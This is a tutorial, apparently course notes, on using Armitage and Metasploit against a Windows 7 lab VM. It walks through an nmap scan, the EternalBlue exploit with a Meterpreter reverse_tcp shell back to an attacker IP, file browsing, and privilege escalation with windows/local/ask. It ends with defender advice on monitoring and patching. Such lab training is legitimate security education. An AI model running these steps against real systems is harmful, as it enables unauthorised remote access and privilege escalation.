# O.R. 5.5 - Armitage — A Tutorial

## Overview

- **Armitage** – a scriptable red team collaboration tool for Metasploit that:
  - Visualizes targets
  - Recommends exploits
  - Exposes advanced post-exploitation features in a GUI
- Underrated tool – eliminates technical complexity and is more convenient than CLI.
- Uses **Metasploit** as the backend – must be installed.
- **Target:** Windows 7 x64 Virtual Machine.
- **Attacker:** Kali Linux (Armitage pre-installed or installable).

---

## Installation (if not pre-installed)

```bash
deb http://http.kali.org/kali kali main non-free contrib
deb-src http://http.kali.org/kali kali main non-free contrib
apt-get update
apt-get install armitage
```

---

## Starting Armitage

### Step 1: Start PostgreSQL

```bash
service postgresql start
```

### Step 2: Initialize Database (if on Kali 2.x)

```bash
msfdb init
```

> **Note:** If you run Armitage before this, a GUI popup will notify you and provide solutions.

### Step 3: Launch Armitage

```bash
sudo armitage
```

- Click **Connect**.
- When prompted to start a **Metasploit RPC Server**, click **Yes**.

---

## Armitage GUI Overview

- **Top Right Panel:** Visual representation of target hosts.
- **Top Left Panel:** Exploit modules (organized by category).
- **Bottom:** Metasploit console (for manual commands).

---

## Exploitation Workflow

### 1. Detect Target (Recon)

- Use **Zenmap** (or Nmap) to scan the target.

```bash
nmap 192.168.0.181
```

- Verify services and determine OS (Windows 7 x64).

### 2. Set Up Handler

In the Armitage console:

```bash
use exploit/multi/handler
```

### 3. Select Exploit

- Search for **EternalBlue** (MS17-010):

```bash
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
```

### 4. Configure Payload

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

### 5. Set Options

```bash
show options
set RHOSTS 192.168.0.181
set LHOST <attacker_ip>
set LPORT 4444   # Change if default doesn't work
```

### 6. Execute Exploit

```bash
run
```

- If successful, a **Meterpreter session** opens.
- Target host icon in the top right panel changes – indicates system is compromised.

---

## Post-Exploitation with Armitage GUI

### Browse Files

- Right-click the compromised host icon.
- Navigate to: **Explore → Browse Files**.
- Opens a file browser GUI for the target system.

### Privilege Escalation

- Right-click host → **Meterpreter → Access → Escalate Privileges**.
- Opens the `/exploit/windows/local` directory in the top left panel.
- Double-click any local exploit (e.g., `windows/local/ask`).

**Example: `windows/local/ask`**
- Popup appears.
- Set **Targets** to `1` (for x64 architecture).
- Click **Launch**.

- This spawns a **new Meterpreter session with admin privileges**.

### Interact with Sessions

```bash
back            # Return to multi/handler
sessions        # List all sessions
sessions -i 2   # Interact with session 2 (admin)
```

---

## Summary: Armitage Workflow

| Step | Action |
|------|--------|
| 1 | Start PostgreSQL (`service postgresql start`) |
| 2 | Launch Armitage (`sudo armitage`) |
| 3 | Scan target with Zenmap/Nmap |
| 4 | Use `multi/handler` and select EternalBlue exploit |
| 5 | Set `RHOSTS`, `LHOST`, `LPORT` |
| 6 | Run exploit → Meterpreter session |
| 7 | Right-click host for post-exploitation (Browse Files, Escalate Privileges) |
| 8 | Run local exploits (e.g., `ask`) for admin privileges |

---

## Key Takeaways

- **Armitage** is a GUI front-end for Metasploit – visualizes targets and simplifies exploitation.
- Must run **PostgreSQL** (`service postgresql start`) before launching Armitage.
- Exploits are executed via the **Metasploit console** within Armitage – same commands as CLI.
- Once a session is obtained, **right-click** the host for GUI-based post-exploitation:
  - File browsing
  - Privilege escalation
  - Session management
- Privilege escalation exploits are organized under **Meterpreter → Access → Escalate Privileges**.
- Armitage is **organized and concise** – great for beginners or when you want to avoid CLI complexity.
- **Defender mindset:** Monitor for Armitage activity (RPC connections, EternalBlue exploitation, local privilege escalation attempts) and keep systems patched against MS17-010 and other known vulnerabilities.